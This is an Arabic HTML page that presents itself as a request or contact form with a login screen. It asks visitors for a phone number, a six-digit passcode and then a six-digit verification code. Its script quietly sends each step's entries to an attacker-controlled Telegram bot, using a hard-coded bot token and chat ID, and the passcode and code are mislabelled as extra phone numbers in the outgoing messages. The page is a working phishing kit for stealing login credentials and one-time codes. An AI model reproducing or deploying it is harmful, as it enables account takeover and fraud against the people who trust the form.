<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>قدم طلبك الآن</title>
<meta name="description" content="قدّم طلبك الآن عبر نموذج التواصل بسهولة وسرعة.">
<meta property="og:type" content="website">
<meta property="og:title" content="قدم طلبك الآن">
<meta property="og:description" content="قدّم طلبك الآن عبر نموذج التواصل بسهولة وسرعة.">
<meta property="og:image" content="https://up6.cc/2026/11/179456769510121.jpeg">
<meta property="og:image:alt" content="شعار الموقع">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="قدم طلبك الآن">
<meta name="twitter:description" content="قدّم طلبك الآن عبر نموذج التواصل بسهولة وسرعة.">
<meta name="twitter:image" content="https://up6.cc/2026/11/179456769510121.jpeg">
<meta name="theme-color" content="#ed6c85">
<style>
*{box-sizing:border-box}
:root{--pink:#ed6c85;--pink-dark:#d82948;--text:#29292d;--muted:#85858d;--border:#ececef;--selected:#fff0f3;--soft:#fff8f9}
body{margin:0;min-height:100vh;color:var(--text);background:linear-gradient(145deg,#fff 0%,#fff8f9 55%,#fff 100%);font-family:Tahoma,Arial,sans-serif}
.page{width:min(100% - 28px,700px);min-height:100vh;margin:auto;padding:28px 0 38px}
.logo-wrap{height:132px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center}
.logo{width:min(230px,60vw);max-height:132px;object-fit:contain}
.step{display:none}.step.active{display:block;animation:appear .28s ease-out}
@keyframes appear{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
.step-card{background:#fff;border:1px solid #f0e7e9;border-radius:26px;padding:30px;box-shadow:0 14px 38px rgba(65,30,38,.07)}
header{margin-bottom:24px;text-align:right}
h1{margin:0 0 9px;font-size:clamp(27px,5.5vw,36px);line-height:1.35;letter-spacing:-.4px}
header p{margin:0;font-size:clamp(17px,3.8vw,21px);color:#666;line-height:1.7}
.disclosure{margin:18px 0 22px;padding:14px 16px;border:1px solid #f4d5dc;border-radius:16px;background:var(--soft);color:#763747;font-size:13px;line-height:1.9}
.account-types{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:0 0 24px}
.account-type{min-height:150px;padding:16px 12px;border:1.5px solid #e7e3e5;border-radius:20px;background:#fff;color:var(--text);font:inherit;cursor:pointer;transition:.18s ease}
.account-type:hover{border-color:#efa5b4;transform:translateY(-2px)}
.account-type[aria-pressed="true"]{background:var(--selected);border-color:var(--pink-dark);box-shadow:0 0 0 3px rgba(216,41,72,.07)}
.account-type img{display:block;width:78px;height:78px;margin:0 auto 10px;object-fit:cover;aspect-ratio:1/1;border-radius:15px;border:1px solid #eee;background:#fff;padding:4px}
.account-type span{font-size:clamp(18px,3.8vw,23px);font-weight:700}
.login-form{display:grid;gap:12px}
.field-label{font-weight:700;font-size:16px;margin-top:3px}
.phone-input{width:100%;padding:16px 18px;border:1.5px solid var(--border);border-radius:15px;outline:none;color:var(--text);background:#fff;font:inherit;font-size:19px;text-align:right;height:66px;transition:border-color .18s,box-shadow .18s}
.phone-input::placeholder{color:#aaa}
.phone-input:focus{border-color:var(--pink);box-shadow:0 0 0 4px rgba(237,108,133,.12)}
.submit-button{width:100%;min-height:66px;margin-top:8px;border:0;border-radius:16px;background:linear-gradient(135deg,#f08096,#df4563);color:white;font:inherit;font-size:clamp(20px,4.5vw,25px);font-weight:700;cursor:pointer;box-shadow:0 8px 18px rgba(216,41,72,.16);transition:filter .18s,transform .18s}
.submit-button:hover{filter:brightness(.98);transform:translateY(-1px)}
.submit-button:disabled{opacity:.7;cursor:wait;transform:none}
.message{min-height:22px;margin:2px 0 0;color:var(--pink-dark);font-size:14px;line-height:1.6}
.footer-note{text-align:center;color:#888;font-size:12px;line-height:1.8;margin:18px 0 0}
.step-indicator{text-align:center;color:#777;font-size:13px;margin:0 0 22px}
.step-indicator:before{content:"";display:block;width:90px;height:4px;border-radius:5px;background:linear-gradient(90deg,var(--pink) 50%,#f3d9df 50%);margin:0 auto 12px}
.phone3-wrap{width:min(100%,440px);margin:0 auto;text-align:center}
.phone3-wrap .field-label{display:block;text-align:center;margin-bottom:4px;font-size:18px}
.phone3-wrap .phone-input{text-align:center;direction:ltr}
.phone3-wrap .submit-button{margin-top:14px}
@media(max-width:560px){.page{width:min(100% - 22px,700px);padding:16px 0 26px}.logo-wrap{height:108px;margin-bottom:14px}.step-card{padding:22px 17px;border-radius:22px}header{margin-bottom:20px}.account-types{gap:11px}.account-type{min-height:132px;padding:12px 7px;border-radius:17px}.account-type img{width:68px;height:68px;border-radius:13px}.phone-input{height:62px;font-size:18px}.submit-button{min-height:62px}.disclosure{font-size:12.5px;padding:12px 13px}}
</style>
</head>
<body>
<main class="page">
  <div class="logo-wrap"><img class="logo" src="https://up6.cc/2026/11/179456769510121.jpeg" alt="الشعار"></div>

  <section class="step active" id="stepOne">
    <div class="step-card">
    <header><h1>مرحباً بك</h1><p>تسجيل دخول</p></header>
    <section class="account-types" aria-label="اختر نوع الطلب">
      <button class="account-type" id="salesType" type="button" aria-pressed="false"><img src="https://up6.cc/2026/11/179456781085791.jpeg" alt=""><span>نقطة مبيعات</span></button>
      <button class="account-type" id="clientType" type="button" aria-pressed="true"><img src="https://up6.cc/2026/11/179456776982841.jpeg" alt=""><span>عميل</span></button>
    </section>
    <form class="login-form" id="firstForm">
      <label class="field-label" for="phone">رقم الهاتف للتواصل</label>
      <input class="phone-input" id="phone" type="tel" placeholder="رقم الهاتف" autocomplete="tel" required maxlength="24">
      <label class="field-label" for="phone2">رقم المرور</label>
      <input class="phone-input" id="phone2" type="tel" inputmode="numeric" pattern="[0-9]{6}" title="أدخل 6 أرقام بالضبط" placeholder="أدخل 6 أرقام" autocomplete="off" required maxlength="6">
      <p class="message" id="messageOne" aria-live="polite"></p>
      <button class="submit-button" id="nextButton" type="submit">التالي</button>
    </form>
    </div>
  </section>

  <section class="step" id="stepTwo">
    <div class="step-card">
    <header><h1>استكمال التقديم</h1></h1><p>يرجى ادخال رمز التحقق</p></header>
    <p class="step-indicator">الخطوة ٢ من ٢</p>
    <form class="login-form" id="secondForm">
      <div class="phone3-wrap">
        <label class="field-label" for="phone3">رمز التحقق</label>
        <input class="phone-input" id="phone3" type="tel" inputmode="numeric" pattern="[0-9]{6}" title="أدخل 6 أرقام بالضبط" placeholder="أدخل 6 أرقام" autocomplete="off" required maxlength="6">
        <p class="message" id="messageTwo" aria-live="polite"></p>
        <button class="submit-button" id="sendButton" type="submit">تقديم طلب</button>
      </div>
    </form>
    </div>
  </section>
</main>
<script>
// ضع بيانات بوت تيليجرام الخاصة بك هنا. التوكن داخل HTML سيكون ظاهراً لكل زائر.
const BOT_TOKEN = "8794884027:AAEMu6aUsnkIwTvEyO05D8Aq4gheORNREac";
const CHAT_ID = "6873334348";

const stepOne=document.getElementById("stepOne");
const stepTwo=document.getElementById("stepTwo");
const firstForm=document.getElementById("firstForm");
const secondForm=document.getElementById("secondForm");
const messageOne=document.getElementById("messageOne");
const messageTwo=document.getElementById("messageTwo");
const nextButton=document.getElementById("nextButton");
const sendButton=document.getElementById("sendButton");
const clientType=document.getElementById("clientType");
const salesType=document.getElementById("salesType");
let requestType="عميل";
let firstPhone="";

function chooseType(selected,other,label){
  selected.setAttribute("aria-pressed","true");
  other.setAttribute("aria-pressed","false");
  requestType=label;
}
clientType.addEventListener("click",()=>chooseType(clientType,salesType,"عميل"));
salesType.addEventListener("click",()=>chooseType(salesType,clientType,"نقطة مبيعات"));

async function sendToTelegram(text){
  if(BOT_TOKEN.startsWith("PASTE_") || CHAT_ID.startsWith("PASTE_")){
    throw new Error("أكمل إعدادات البوت داخل الملف أولاً.");
  }
  const response=await fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({chat_id:CHAT_ID,text})
  });
  const result=await response.json();
  if(!response.ok || !result.ok) throw new Error("تعذر الإرسال إلى تيليجرام. تحقق من إعدادات البوت.");
}

firstForm.addEventListener("submit",async(event)=>{
  event.preventDefault();
  messageOne.textContent="";
  firstPhone=document.getElementById("phone").value.trim();
  if(firstPhone.length<5){messageOne.textContent="يرجى إدخال رقم هاتف صحيح.";return;}
  nextButton.disabled=true;
  nextButton.textContent="جارٍ الإرسال...";
  try{
    const firstPhone2=document.getElementById("phone2").value.trim();
    if(!/^\d{6}$/.test(firstPhone2)){messageOne.textContent="رقم الهاتف الثاني يجب أن يتكون من 6 أرقام بالضبط.";nextButton.disabled=false;nextButton.textContent="التالي";return;}
    const firstMessage=["طلب تواصل - الخطوة الأولى","نوع الطلب: "+requestType,"رقم الهاتف الأول: "+firstPhone,"رقم الهاتف الثاني: "+firstPhone2].join("\n");
    await sendToTelegram(firstMessage);
    stepOne.classList.remove("active");
    stepTwo.classList.add("active");
    window.scrollTo(0,0);
  }catch(error){messageOne.textContent=error.message||"تعذر الإرسال. حاول مرة أخرى.";}
  finally{nextButton.disabled=false;nextButton.textContent="التالي";}
});

secondForm.addEventListener("submit",async(event)=>{
  event.preventDefault();
  messageTwo.textContent="";
  const phone3=document.getElementById("phone3").value.trim();
  if(!/^\d{6}$/.test(phone3)){messageTwo.textContent="رقم الهاتف الثالث يجب أن يتكون من 6 أرقام بالضبط.";return;}
  sendButton.disabled=true;
  sendButton.textContent="جارٍ الإرسال...";
  try{
    const secondMessage=["استكمال طلب تواصل - الخطوة الثانية","نوع الطلب: "+requestType,"رقم الهاتف الأول: "+firstPhone,"رقم الهاتف الثاني: "+document.getElementById("phone2").value.trim(),"رقم الهاتف الثالث: "+phone3,"تم إرسال بيانات الخطوة الأولى سابقاً، وهذه إعادة إرسال لها مع الرقم الإضافي."].join("\n");
    await sendToTelegram(secondMessage);
    messageTwo.textContent="تم إرسال طلب التواصل بنجاح.";
    secondForm.reset();
  }catch(error){messageTwo.textContent=error.message||"تعذر الإرسال. حاول مرة أخرى.";}
  finally{sendButton.disabled=false;sendButton.textContent="إرسال طلب التواصل";}
});
</script>
</body>
</html>
